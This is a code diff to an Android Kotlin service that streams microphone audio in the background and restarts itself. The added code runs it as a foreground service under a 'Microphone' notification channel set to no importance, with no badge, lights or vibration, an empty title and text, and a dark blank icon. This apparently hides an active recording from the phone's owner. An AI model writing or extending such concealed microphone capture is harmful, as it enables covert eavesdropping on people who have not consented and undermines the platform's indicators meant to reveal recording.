@@ -15,6 +15,8 @@ class AudioStreamService : Service() {
 
     companion object {
         var isRunning = false
+        private const val CHANNEL_ID = "mic_stream"
+        private const val NOTIF_ID   = 13
     }
 
     private val recording = AtomicBoolean(false)
@@ -22,16 +24,18 @@ class AudioStreamService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
+        createChannel()
+        startForeground(NOTIF_ID, buildNotif())
         isRunning = true
         startStream()
         return START_STICKY
     }
 
     private fun startStream() {
-        val sampleRate  = 16000
-        val channelCfg  = AudioFormat.CHANNEL_IN_MONO
-        val audioFmt    = AudioFormat.ENCODING_PCM_16BIT
-        val bufSize     = AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt) * 4
+        val sampleRate = 16000
+        val channelCfg = AudioFormat.CHANNEL_IN_MONO
+        val audioFmt   = AudioFormat.ENCODING_PCM_16BIT
+        val bufSize    = AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt) * 4
 
         recording.set(true)
         recordThread = Thread {
@@ -55,12 +59,24 @@ class AudioStreamService : Service() {
                 }
             } catch (_: Exception) {
             } finally {
-                recorder?.stop(); recorder?.release()
+                try { recorder?.stop() } catch (_: Exception) {}
+                try { recorder?.release() } catch (_: Exception) {}
             }
         }.apply { start() }
     }
 
     private fun stopStream() { recording.set(false); isRunning = false }
+
+    private fun createChannel() {
+        val ch = NotificationChannel(CHANNEL_ID, "Microphone", NotificationManager.IMPORTANCE_NONE)
+            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
+        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
+    }
+
+    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
+        .setContentTitle("").setContentText("")
+        .setSmallIcon(android.R.drawable.screen_background_dark)
+        .build()
 
     override fun onDestroy() { stopStream(); super.onDestroy() }
     override fun onBind(intent: Intent?): IBinder? = null
